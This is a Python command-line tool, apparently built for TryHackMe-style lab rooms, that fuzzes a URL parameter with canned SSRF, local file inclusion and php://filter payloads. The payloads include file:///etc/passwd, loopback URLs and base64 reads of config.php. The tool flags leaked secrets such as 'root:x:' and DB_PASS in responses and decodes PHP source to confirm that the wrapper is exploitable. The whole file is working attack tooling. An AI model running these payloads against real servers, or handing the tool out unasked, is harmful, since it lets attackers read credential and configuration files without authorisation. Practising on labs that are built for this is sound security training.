#!/usr/bin/env python3
"""Probe SSRF/LFI/PHP-wrapper style URL parameters with canned payloads."""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import re
import statistics
import sys
from dataclasses import asdict
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib.parse import quote
from urllib.parse import urlencode
from urllib.parse import urlparse
from urllib.parse import urlsplit
from urllib.parse import urlunsplit
from urllib.parse import parse_qsl

try:
    import requests as requests_client
    from requests import exceptions as requests_exceptions
except ImportError:  # pragma: no cover - fallback for stripped environments
    import http_client as requests_client

    class _CompatExceptions:
        RequestException = requests_client.RequestException
        Timeout = getattr(requests_client, "Timeout", requests_client.RequestException)

    requests_exceptions = _CompatExceptions()


FUZZ_MARKER = "FUZZ"
DEFAULT_TIMEOUT = 5.0
PREVIEW_LIMIT = 400
DEFAULT_PAYLOADS: tuple[str, ...] = (
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "file:///var/www/html/index.php",
    "file:///var/www/html/config.php",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "ftp://127.0.0.1/",
    "data://text/plain,test",
)
HIGHLIGHT_MARKERS: tuple[str, ...] = (
    "/etc/passwd",
    "root:x:",
    "<?php",
    "DB_HOST",
    "DB_USER",
    "DB_PASS",
    "define(",
    "Warning",
    "Fatal error",
    "Exception",
    "Permission denied",
)
BASE64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/=\s]{32,})(?![A-Za-z0-9+/=])")
PHP_LIKE_MARKERS: tuple[str, ...] = (
    "<?php",
    "define(",
    "DB_HOST",
    "DB_USER",
    "DB_PASS",
    "require",
    "include",
    "function ",
)


class Ansi:
    enabled = sys.stdout.isatty() and os.environ.get("NO_COLOR", "") == ""
    reset = "\033[0m" if enabled else ""
    red = "\033[31m" if enabled else ""
    green = "\033[32m" if enabled else ""
    yellow = "\033[33m" if enabled else ""
    blue = "\033[34m" if enabled else ""
    cyan = "\033[36m" if enabled else ""
    bold = "\033[1m" if enabled else ""


@dataclass
class ProbeResult:
    payload: str
    url: str
    status: int | None
    length: int
    timeout: bool
    preview: str
    markers: list[str]
    outlier: bool = False
    error: str = ""
    elapsed_ms: int = 0
    save_path: str = ""


@dataclass
class PhpFilterResult:
    resource: str
    payload: str
    url: str
    confirmed: bool
    markers: list[str]
    error: str = ""
    decoded_preview: str = ""


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="probe",
        description="Probe URL-accepting endpoints with SSRF/LFI/PHP-wrapper payloads.",
    )
    parser.add_argument("url", help=f"URL template that contains {FUZZ_MARKER} or an empty query parameter")
    parser.add_argument("--payloads", metavar="FILE", help="Use custom payload file")
    parser.add_argument("--raw", action="store_true", help="Show full response body")
    parser.add_argument("--save", action="store_true", help="Save responses to files")
    parser.add_argument("--json", action="store_true", dest="json_out", help="Emit JSON")
    parser.add_argument("-o", metavar="DIR", dest="output_dir", help="Directory for saved responses")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, metavar="SEC", help=f"HTTP timeout (default: {DEFAULT_TIMEOUT:g})")
    parser.add_argument("-k", "--insecure", action="store_true", help="Skip TLS certificate verification")
    args = parser.parse_args(argv)

    args.url = resolve_input_url(args.url)
    if FUZZ_MARKER not in args.url:
        parser.error(f"URL must contain {FUZZ_MARKER} or include an empty query parameter")
    if args.timeout <= 0:
        parser.error("--timeout must be positive")
    if args.payloads and not Path(args.payloads).is_file():
        parser.error(f"payload file not found: {args.payloads}")
    if args.output_dir and not args.save:
        args.save = True
    return args


def load_payloads(path: str | None) -> list[str]:
    if path is None:
        return list(DEFAULT_PAYLOADS)
    payloads: list[str] = []
    with Path(path).open("r", encoding="utf-8") as handle:
        for raw in handle:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            payloads.append(line)
    return dedupe_preserve_order(payloads)


def dedupe_preserve_order(items: list[str]) -> list[str]:
    seen: set[str] = set()
    output: list[str] = []
    for item in items:
        if item in seen:
            continue
        seen.add(item)
        output.append(item)
    return output


def resolve_case_home() -> Path | None:
    raw = (os.environ.get("CASE_HOME") or "").strip()
    if raw:
        path = Path(raw)
        if path.is_dir():
            return path

    cwd = Path.cwd().resolve()
    parts = cwd.parts
    try:
        idx = parts.index("cases")
    except ValueError:
        return None
    if idx == 0 or idx + 1 >= len(parts):
        return None
    return Path(*parts[: idx + 2])


def default_output_dir() -> Path:
    case_home = resolve_case_home()
    if case_home is not None:
        return case_home / "exports" / "probe"
    return Path.cwd() / "probe-output"


def resolve_target_ip() -> str:
    ip = (os.environ.get("IP") or "").strip()
    if ip:
        return ip

    case_home = resolve_case_home()
    if case_home is None:
        return ""
    target_file = case_home / ".target"
    if not target_file.is_file():
        return ""
    return target_file.read_text(encoding="utf-8").splitlines()[0].strip()


def resolve_case_name() -> str:
    case_name = (os.environ.get("CASE") or "").strip()
    if case_name:
        return case_name
    case_home = resolve_case_home()
    if case_home is None:
        return ""
    return case_home.name


def iter_case_hosts() -> list[str]:
    case_home = resolve_case_home()
    if case_home is None:
        return []
    hosts_file = case_home / ".hosts"
    if not hosts_file.is_file():
        return []

    names: list[str] = []
    for raw in hosts_file.read_text(encoding="utf-8").splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        names.extend(parts[1:])
    return names


def resolve_default_host() -> str:
    case_name = resolve_case_name()
    case_hosts = iter_case_hosts()
    if case_name:
        preferred = f"{case_name}.thm"
        for host in case_hosts:
            if host == preferred:
                return host
    if case_hosts:
        return case_hosts[0]
    return resolve_target_ip()


def resolve_input_url(raw: str) -> str:
    text = raw.strip()
    parsed = urlparse(text)
    if parsed.scheme and parsed.netloc:
        return text

    default_host = resolve_default_host()
    if not default_host:
        raise ValueError("host omitted but no room host/IP context found (cases set <room>, hosts <room>.thm, or target-set <ip>)")

    if text.startswith(":"):
        slash = text.find("/")
        query = text.find("?")
        end = len(text)
        if slash != -1:
            end = min(end, slash)
        if query != -1:
            end = min(end, query)
        port = text[1:end]
        rest = text[end:] if end < len(text) else "/"
        if port.isdigit():
            if not rest.startswith("/"):
                rest = f"/{rest}"
            return f"http://{default_host}:{port}{rest}"

    path = text
    if text.startswith("?"):
        path = f"/{text}"
    elif not text.startswith("/"):
        path = f"/{text}"
    return inject_fuzz_marker(f"http://{default_host}{path}")


def inject_fuzz_marker(url: str) -> str:
    if FUZZ_MARKER in url:
        return url

    parsed = urlsplit(url)
    query_items = parse_qsl(parsed.query, keep_blank_values=True)
    if not query_items:
        return url

    replaced = False
    normalized_items: list[tuple[str, str]] = []
    for key, value in query_items:
        if not replaced and value == "":
            normalized_items.append((key, FUZZ_MARKER))
            replaced = True
            continue
        normalized_items.append((key, value))

    if not replaced:
        return url

    new_query = urlencode(normalized_items, doseq=True)
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))


def build_target_url(template: str, payload: str) -> str:
    encoded = quote(payload, safe="")
    return template.replace(FUZZ_MARKER, encoded)


def is_php_endpoint(url: str) -> bool:
    path = urlsplit(url).path.lower()
    return path.endswith(".php")


def php_filter_resources(url: str) -> list[str]:
    path = urlsplit(url).path
    basename = Path(path).name
    resources: list[str] = []
    if basename.lower().endswith(".php"):
        resources.append(basename)
    resources.extend(["index.php", "config.php"])
    return dedupe_preserve_order(resources)


def normalize_base64_candidate(text: str) -> str:
    cleaned = re.sub(r"\s+", "", text)
    if not cleaned:
        return ""
    if re.search(r"[^A-Za-z0-9+/=]", cleaned):
        return ""
    padding = len(cleaned) % 4
    if padding:
        cleaned += "=" * (4 - padding)
    return cleaned


def decode_php_like_body(text: str) -> tuple[str, list[str]]:
    candidates = [text]
    candidates.extend(match.group(1) for match in BASE64_RE.finditer(text))
    seen: set[str] = set()
    for candidate in candidates:
        normalized = normalize_base64_candidate(candidate)
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        try:
            decoded = base64.b64decode(normalized, validate=False).decode("utf-8", errors="replace")
        except Exception:
            continue
        markers = [marker for marker in PHP_LIKE_MARKERS if marker.lower() in decoded.lower()]
        if markers:
            return decoded, markers
    return "", []


def read_response(response: Any) -> tuple[int | None, dict[str, str], bytes]:
    status = getattr(response, "status_code", None)
    headers = dict(getattr(response, "headers", {}) or {})

    if hasattr(response, "content"):
        body = response.content
    else:
        body = b"".join(response.iter_content(8192))
        close = getattr(response, "close", None)
        if callable(close):
            close()
    return status, headers, body


def body_to_text(body: bytes, raw: bool) -> str:
    text = body.decode("utf-8", errors="replace")
    if raw:
        return text
    return text[:PREVIEW_LIMIT]


def find_markers(text: str) -> list[str]:
    lower_text = text.lower()
    found: list[str] = []
    for marker in HIGHLIGHT_MARKERS:
        if marker.lower() in lower_text:
            found.append(marker)
    return found


def highlight_preview(text: str) -> str:
    if not Ansi.enabled or not text:
        return text
    pattern = re.compile("|".join(re.escape(item) for item in HIGHLIGHT_MARKERS), re.IGNORECASE)
    return pattern.sub(lambda m: f"{Ansi.yellow}{Ansi.bold}{m.group(0)}{Ansi.reset}", text)


def sanitize_filename(payload: str) -> str:
    slug = re.sub(r"[^A-Za-z0-9]+", "_", payload).strip("_").lower()
    return slug[:40] or "payload"


def save_response(directory: Path, index: int, payload: str, body: bytes) -> Path:
    digest = hashlib.sha1(payload.encode("utf-8")).hexdigest()[:8]
    filename = f"{index:02d}_{sanitize_filename(payload)}_{digest}.txt"
    path = directory / filename
    path.write_bytes(body)
    return path


def is_outlier(length: int, median_length: float) -> bool:
    if median_length <= 0:
        return length > 0
    ratio = length / median_length
    return (ratio >= 2.0 or ratio <= 0.5) and abs(length - median_length) >= 64


def request_once(
    session: Any,
    *,
    template: str,
    payload: str,
    timeout: float,
    insecure: bool,
    raw: bool,
    save_dir: Path | None,
    index: int,
) -> ProbeResult:
    import time

    url = build_target_url(template, payload)
    started = time.monotonic()
    try:
        if hasattr(session, "get"):
            response = session.get(url, timeout=(timeout, timeout), allow_redirects=True, verify=not insecure)
        else:
            session.verify = not insecure
            response = session.request("GET", url, timeout=(timeout, timeout), allow_redirects=True)
        status, _headers, body = read_response(response)
        preview = body_to_text(body, raw)
        save_path = ""
        if save_dir is not None:
            save_path = str(save_response(save_dir, index, payload, body))
        return ProbeResult(
            payload=payload,
            url=url,
            status=status,
            length=len(body),
            timeout=False,
            preview=preview,
            markers=find_markers(preview if raw else body.decode("utf-8", errors="replace")),
            elapsed_ms=int((time.monotonic() - started) * 1000),
            save_path=save_path,
        )
    except requests_exceptions.Timeout as exc:
        return ProbeResult(
            payload=payload,
            url=url,
            status=None,
            length=0,
            timeout=True,
            preview="",
            markers=[],
            error=str(exc) or "timeout",
            elapsed_ms=int((time.monotonic() - started) * 1000),
        )
    except requests_exceptions.RequestException as exc:
        return ProbeResult(
            payload=payload,
            url=url,
            status=None,
            length=0,
            timeout=False,
            preview="",
            markers=[],
            error=str(exc),
            elapsed_ms=int((time.monotonic() - started) * 1000),
        )


def print_result(result: ProbeResult) -> None:
    header = f"[{result.payload}]"
    print(f"{Ansi.cyan}{Ansi.bold}{header}{Ansi.reset}")
    if result.error:
        status_value = "TIMEOUT" if result.timeout else "ERROR"
        print(f"Status: {Ansi.red}{status_value}{Ansi.reset}")
        print(f"Error: {result.error}")
        print()
        return

    status_color = Ansi.green if result.status and result.status < 400 else Ansi.yellow
    outlier_text = f" {Ansi.yellow}[length-outlier]{Ansi.reset}" if result.outlier else ""
    timeout_text = f"{Ansi.red}yes{Ansi.reset}" if result.timeout else f"{Ansi.green}no{Ansi.reset}"
    print(f"Status: {status_color}{result.status}{Ansi.reset}")
    print(f"Length: {result.length}{outlier_text}")
    print(f"Timeout: {timeout_text}")
    print(f"Time: {result.elapsed_ms} ms")
    if result.markers:
        print(f"Markers: {Ansi.yellow}{', '.join(result.markers)}{Ansi.reset}")
    if result.save_path:
        print(f"Saved: {result.save_path}")
    print()
    print(highlight_preview(result.preview))
    print()


def print_php_filter_summary(results: list[PhpFilterResult]) -> None:
    if not results:
        return
    confirmed = [result for result in results if result.confirmed]
    print(f"{Ansi.blue}{Ansi.bold}[PHP Filter Check]{Ansi.reset}")
    if confirmed:
        print(f"{Ansi.green}[+] php://filter appears usable{Ansi.reset}")
        for result in confirmed:
            print(f"{Ansi.green}[+] Decoded PHP-like content found: {result.resource}{Ansi.reset}")
            if result.markers:
                print(f"    markers: {', '.join(result.markers)}")
    else:
        print(f"{Ansi.red}[-] php://filter not confirmed{Ansi.reset}")
    print()


def emit_json(results: list[ProbeResult]) -> None:
    payload = {"results": [asdict(result) for result in results]}
    print(json.dumps(payload, ensure_ascii=False, indent=2))


def check_php_filter(session: Any, template: str, timeout: float, insecure: bool) -> list[PhpFilterResult]:
    if not is_php_endpoint(template):
        return []

    results: list[PhpFilterResult] = []
    for resource in php_filter_resources(template):
        payload = f"php://filter/convert.base64-encode/resource={resource}"
        probe_result = request_once(
            session,
            template=template,
            payload=payload,
            timeout=timeout,
            insecure=insecure,
            raw=True,
            save_dir=None,
            index=0,
        )
        if probe_result.error:
            results.append(
                PhpFilterResult(
                    resource=resource,
                    payload=payload,
                    url=probe_result.url,
                    confirmed=False,
                    markers=[],
                    error=probe_result.error,
                )
            )
            continue

        decoded, markers = decode_php_like_body(probe_result.preview)
        results.append(
            PhpFilterResult(
                resource=resource,
                payload=payload,
                url=probe_result.url,
                confirmed=bool(decoded and markers),
                markers=markers,
                decoded_preview=decoded[:PREVIEW_LIMIT],
            )
        )
    return results


def run(argv: list[str]) -> int:
    args = parse_args(argv)
    payloads = load_payloads(args.payloads)
    session = requests_client.Session()

    save_dir: Path | None = None
    if args.save:
        save_dir = Path(args.output_dir) if args.output_dir else default_output_dir()
        save_dir.mkdir(parents=True, exist_ok=True)

    results: list[ProbeResult] = []
    for index, payload in enumerate(payloads, start=1):
        results.append(
            request_once(
                session,
                template=args.url,
                payload=payload,
                timeout=args.timeout,
                insecure=args.insecure,
                raw=args.raw,
                save_dir=save_dir,
                index=index,
            )
        )
    php_filter_results = check_php_filter(session, args.url, args.timeout, args.insecure)

    lengths = [result.length for result in results if not result.error]
    if lengths:
        median_length = statistics.median(lengths)
        for result in results:
            if not result.error:
                result.outlier = is_outlier(result.length, median_length)

    if args.json_out:
        payload = {
            "results": [asdict(result) for result in results],
            "php_filter": [asdict(result) for result in php_filter_results],
        }
        print(json.dumps(payload, ensure_ascii=False, indent=2))
    else:
        for result in results:
            print_result(result)
        print_php_filter_summary(php_filter_results)

    return 0


def main(argv: list[str] | None = None) -> int:
    try:
        return run(list(sys.argv[1:] if argv is None else argv))
    except KeyboardInterrupt:
        print("\n[-] probe: interrupted", file=sys.stderr)
        return 130
    except SystemExit:
        raise
    except Exception as exc:  # pragma: no cover - CLI guard
        print(f"[-] probe: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
